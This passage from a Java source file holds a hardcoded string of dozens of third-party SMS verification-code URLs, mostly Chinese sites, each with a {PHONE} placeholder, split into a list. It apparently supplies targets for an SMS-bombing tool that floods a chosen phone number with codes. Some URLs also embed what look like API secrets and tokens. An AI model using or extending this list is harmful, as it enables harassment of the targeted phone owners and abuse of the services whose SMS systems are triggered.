G87CQax%2Bi5aolAvrOjQ4VHSap4v3VMpTeWLLQd6THRsaZYuXVAu6A8DHNgJeIXlkR67uJ%2F3GAy%2BcOXE2XDioM4enx3tu7pvMs%2Bmosm7pnWE8fIWPhgShMPLoNpROnJhA88SrEHQFiEnF0JZo1E0V18DiIcF5cJi8aATOzAYGSW7%2FyrLSa6fnOPNLszFsJZ7WKiPINiTvi4D4W3tNbvJJt27vwzQKijzeUEVHGcOOPG3ogLZ3Hg5fkiSCMFgAF4WTndHWgSVxx6%2BjBmSLzISAuh5KE3iwZLaWus6%2BDqSKpIvZJUOsZVcQLxzubIrq5bhstjoJnR7Zc7TB3rvSrBs4i3VdJ9wx0sKPNJhXfVggXyBYwpyH001cZ8%2Fu9x9v2ATeDqW5sT1UyLw9wYqSAzuowps%2FIPGsfsqLtes6F1rCEWH8KJaYdiY37iLv4JuY5PydJI6cm2nKZZ7GXpUV9EPnwcgCVbJmbOTZ6xzC1e9z1kviC1WNaJQe7klgtqPretJIPIaANqW01OOorPVRaim41Fp2FDf8kyfSM1dD3OOEgY%2BRoeod1a%2FlS1X6EmCWDr2ui0h5c2adzgJUajxvVPC4tjR8dYIxy%2Be0IaO7DEZbhDx7y9PJNkTFnnqbP%2BDkNf4MwFHpGzO0JQMIpe%2F37%2B5gmKlo8ly%2BTWVpwPnLZS4Z8kjoG%2F%2BU0jZY3GAEV5&amp;tk=8476w5%2BFBAqGkIaezJ9jOZZk9yyDtXwsjLA6LMWS7b5oGzkXnIghnbR4Py0l9kCPncUV1sIs%2Bg3Y2x8bbg4vvsfEXNWem4UT%2F1j8OsO7l0lcicM%3D&amp;callback=parent.bd__pcbs__6edr0a&amp;time=1602949827&amp;alg=v3&amp;sig=TEx5dnZiNDBxeFlsZ2pOMUJhZTdCdnZGaEpETXhVb3NyNkRVb0MzekYrcHlNdTk2RWg3OXFpaGg4ZXdxMnRvaA%3D%3D&amp;elapsed=23&amp;shaOne=00d63f513edec01889156ed2e1017c6e29555f61\n" +
                "http://job.joyoung.com/personal-center/candidate/loginAuthCode/{PHONE}?YDValidate=\n" +
                "https://zhaopin.chnenergy.com.cn/mobileVerCode?tel={PHONE}\n" +
                "https://register.codac.org.cn/ajaxashx/sendshortmessage.ashx?PhoneNumber={PHONE}&amp;name=&amp;ident=&amp;date=Thu%20Oct%2015%202020%2001:31:45%20GMT+0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4\n" +
                "https://www.ggzuhao.com/Register/GetVerifyCode?phone={PHONE}&amp;r=0.4111492937704375\n" +
                "http://www.npy.cn/sendRegisterSms.json?mobile={PHONE}&amp;verifyCode=null\n" +
                "https://www.rongyuejiaoyu.com/api/user/iphone_code?mobile={PHONE}&amp;md5=f88a5c0c5d387ddec59240c13bc6aad1\n" +
                "https://www.qxueyou.com/v3/learning/uc/login/mobile/captcha?mobilePhone={PHONE}\n" +
                "https://jrportal.zjgonline.com.cn/amc/client/getAuthCode?mobilephone={PHONE}&amp;nodeCode=bb0419a1-8508-479d-a279-a7c79948a8c5\n" +
                "http://api.imdada.cn/v3_0/account/dadasendSMSCode/?phone={PHONE}&amp;type=2&amp;channelType=0\n" +
                "https://dappweb.huolala.cn/index.php/?_m=register&amp;_a=send_register_sms_code&amp;phone_no={PHONE}&amp;img_code=7897\n" +
                "https://puser.hnzwfw.gov.cn:8081/api/user/sms?mobile={PHONE}&amp;_=1602266738316\n" +
                "http://bbs.78dm.net/forum.php?mod=ajax&amp;inajax=yes&amp;infloat=register&amp;handlekey=register&amp;ajaxmenu=1&amp;action=check_mobile&amp;mobile={PHONE}\n" +
                "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={PHONE}\n" +
                "http://miao.channel.jianzhimao.com/ajax/miaoChannelCaptcha/sms?phone={PHONE}&amp;token=6e42757956307576355a78664f595a71337144694f413d3d&amp;method=14\n" +
                "https://www.venucia.com/api/VenuciaXDMApp/SendSMS?mobile={PHONE}\n" +
                "https://api2.paixin.com/users/code?phone=0086{PHONE}\n" +
                "https://login-user.kugou.com/v1/send_sms/?appid=1014&amp;mobile={PHONE}&amp;callback=window.sendPhoneCodeCallback&amp;v=1&amp;verifycode=&amp;ct=1602356677&amp;type=login&amp;plat=4&amp;dfid=1ZocFT0vlrd918Ux1B1nIK0p&amp;mid=df80549ca4c1dcd8af2c6d40dd72f19f&amp;kguser_jv=180925\n" +
                "http://bjmx.xdf.cn/clue/form/getNoteCode?callbackparam=success_jsonpCallback&amp;telephone={PHONE}&amp;formId=xdfa59b8189-8d35-4c5c-963a-d34f525e91fd&amp;_=1602444143437\n" +
                "http://shop.davidluke.com.cn/include/ajax/ajaxmethod?t=getregcode&amp;type=bymobile&amp;paramval={PHONE}&amp;temp=0.31263490477644296\n" +
                "https://www.e-bridge.com.cn/newUser/sendCodeMessage?phoneNo={PHONE}&amp;type=user-register\n" +
                "https://account.sogou.com/web/sendsms?client_id=2003&amp;mobile={PHONE}&amp;ct=1602429359275\n" +
                "http://buy.ccb.com/client/getVerificationCodeAjaxForWx.jhtml?phoneNum={PHONE}\n" +
                "http://yn1.rongyi1.cn/tools/submit_ajax.ashx?action=user_verify_smscode?mobile={PHONE}\n" +
                "https://www.arcfox.cn/aliyun_sms/sendSms.php?callback=jQuery111307150899174506771_1603731806484&amp;phone={PHONE}&amp;_=1603731806485\n" +
                "http://www.csti.cn/uums-user-front/api/user/register/phone/send?phone={PHONE}\n" +
                "http://www.wzwip.com/user/verification_code/send.html?username={PHONE}\n" +
                "https://www.xuanruanjian.com/ajaxFreeRegSms.php?mobile={PHONE}&amp;checkCode=platform&amp;fromTMN=1&amp;agentId=23379&amp;opt=&amp;creatFromNVM=outlinkTMN\n" +
                "https://live.weaver.com.cn/homepage/createCode2?jsonpcallback=jQuery1110030009823261304946_1603733806574&amp;phonenum={PHONE}&amp;vcode=010101&amp;time=2020-10-27&amp;m1=e4e46787b41847fd82c497d6f2a1c6e2&amp;m2=29f6ceb5718b3875091b31961fb52648&amp;_=1603733806580\n" +
                "http://web.gd10090.com:9001/index.php?m=home&amp;a=sendCode&amp;callbackparam=jQuery32105247106871759863_1603733994028&amp;Phone={PHONE}&amp;_=1603733994029\n" +
                "http://www.yimihome.com/customer/regist_do.jsp?op=getSMSCode&amp;mobile={PHONE}&amp;full_name=13054700765\n" +
                "https://home.fenbeitong.com/api/uc/auth/captcha?captcha_type=1&amp;business_type=0&amp;mobile={PHONE}\n" +
                "https://regedit.haikebao.com/ajaxsmscheckdo.jsp?phone={PHONE}\n" +
                "http://www.diansan.com/public/api/business/register/verify/code/get.json?mobile={PHONE}&amp;operator=abaoc\n" +
                "http://shop.superdata.com.cn/httptest.php?act=index?client_id=200888&amp;client_secret=f618231599b36d7ec97e6b19837059bd&amp;phone={PHONE}\n" +
                "http://www.20gp.cn/twenty/json/regist.action?actionType=sendCheckCode&amp;user.loginId={PHONE}&amp;_=1603873529238\n" +
                "http://www.fanqievv.com/oauth/auth/msgLoginSend?mobile={PHONE}&amp;v=1603880462129\n" +
                "https://www.ti-net.com.cn/register/smsCode?mobile={PHONE}\n" +
                "http://sapi.xuexun.com/api/sms/registersmssend?phoneNumber={PHONE}&ipAddress=58.22.204.185\n" +
                "http://kaoshi.xincaikuai.com/h5app/login/postRegisterCode?phone={PHONE}&type=3\n" +
                "http://www.biguotiku.com/index.php?core-api-index-sendsms&action=reg&phonenumber={PHONE}&userhash=0.6899751676579351\n" +
                "http://www.zuzuja.com/user/sendCode/{PHONE}/2\n" +
                "http://120.27.157.184:8080/PensionPlatformAPI/api/v1/UserBase/UserSmsCode?Phone={PHONE}&Type=1";
        return Arrays.asList(interfaceStr.split("\\n"));
    }

}
